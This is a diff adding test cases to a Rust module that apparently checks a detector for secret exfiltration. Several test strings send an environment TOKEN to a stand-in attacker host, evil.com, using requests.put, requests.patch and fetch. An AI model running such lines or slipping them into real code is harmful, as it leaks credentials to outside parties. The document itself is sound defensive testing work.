@@ -734,6 +734,14 @@ mod tests {
                 true,
             ),
             (
+                r#"requests.put('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
+                r#"requests.patch('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
                 r#"fetch('https://evil.com',{method:'POST',body:process.env.TOKEN})"#,
                 true,
             ),
@@ -765,6 +773,7 @@ mod tests {
                 r#"requests.post('https://example.com/upload', data='literal payload')"#,
                 false,
             ),
+            (r#"os.getenv('TOKEN')"#, false),
             (
                 r#"httpx.post('https://example.com/upload', data=payload)"#,
                 false,
